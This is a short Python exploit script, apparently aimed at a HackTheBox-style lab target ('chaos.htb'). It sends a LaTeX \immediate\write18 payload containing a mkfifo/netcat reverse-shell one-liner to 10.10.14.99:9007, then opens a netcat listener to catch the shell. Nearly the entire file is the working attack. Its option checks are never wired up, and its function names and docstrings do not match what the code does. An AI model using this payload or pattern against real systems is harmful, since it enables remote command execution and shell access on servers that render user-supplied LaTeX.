#coding:utf-8

import sys
import requests
import nclib
import options
import re

from optparse import *
from nclib import TCPServer

class IncorrectProgramException(Exception):
	def __init__(self, OutputCondition=None):
		self.OutputCondition = OutputCondition

# This tool allows to exploit Latex without any problem.
# You will also have the opportunity to do a reverse shell.

def BertModel():
	"""

	This function will allow us to test conditions,
	and to make the attack.

	Parameters
	----
	None Parameters.

	Return
	----
	This function will
	return values.

	"""
	ListenerPort = nclib.Netcat(listen=('', 9007))
	ListenerPort.interact()

def ExtensionModel():
	"""

	This function will allow us to test conditions,
	and to make the attack.

	Parameters
	----
	None Parameters.

	Return
	----
	This function will
	return values.

	"""
	if(options.URL.startswith(("http://", "https://")) == False):
		raise IncorrectProgramException("URL is incorrect sorry :/")
	if not(re.search('(\w+[=]+\w+[&]{0,})', options.DATA)):
		raise IncorrectProgramException("DATA is incorrect sorry :/")
	
	# Testing all default in program.
	# It's very simple code and efficase.

	ArgumentDATA = {"content":"\immediate\write18{rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.99 9007 >/tmp/f}", "template":"test1"}
	requests.post("http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php", data=ArgumentDATA)

if __name__ == "__main__":
	ExtensionModel(), BertModel()
